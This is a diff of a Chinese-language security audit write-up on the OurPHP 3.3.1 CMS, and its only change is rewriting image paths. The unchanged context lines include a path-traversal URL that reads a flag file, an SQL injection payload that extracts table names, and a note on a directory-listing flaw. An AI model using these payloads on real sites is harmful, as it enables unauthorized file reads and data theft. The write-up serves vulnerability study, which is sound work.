@@ -53,7 +53,7 @@
 
 `listDirFiles`函数的作用就是得到这个目录下的所有文件夹和文件。然后如果传入了`$_GET['dir']`，就会把没有点的，还有存在特定后缀的文件给打印出来，基本涵盖了大部分的文件，存在目录遍历：
 
-![pic27](D:\this_is_feng\github\CTF\Web\picture\pic27.png)
+![pic27](OurPHP3.3.1审计与测试.assets/pic27.png)
 
 
 
@@ -109,7 +109,7 @@
 http://www.ourphp331.com/client/manage/ourphp_filebox.php?path=../../../../../../../../../../../../../../../../flag&edit
 ```
 
-![pic30](D:\this_is_feng\github\CTF\Web\picture\pic30.png)
+![pic30](OurPHP3.3.1审计与测试.assets/pic30.png)
 
 
 
@@ -282,7 +282,7 @@ http://www.ourphp331.com/client/manage/ourphp_adview.php?ourphp_cms=edit&id=1
 OP_Adclass[]=',`OP_Adclass` =(select substr(group_concat(table_name)1,32) from information_schema.tables where table_schema=database()) where id = 1%23
 ```
 
-![pic28](D:\this_is_feng\github\CTF\Web\picture\pic28.png)
+![pic28](OurPHP3.3.1审计与测试.assets/pic28.png)
 
 
 
@@ -462,7 +462,7 @@ http://www.ourphp331.com/client/manage/ourphp_banner.php?ourphp_cms=del&id=8
 
 这个id通过看一下插入的这个banner的序号即可。
 
-![pic29](D:\this_is_feng\github\CTF\Web\picture\pic29.png)
+![pic29](OurPHP3.3.1审计与测试.assets/pic29.png)
 
 
 
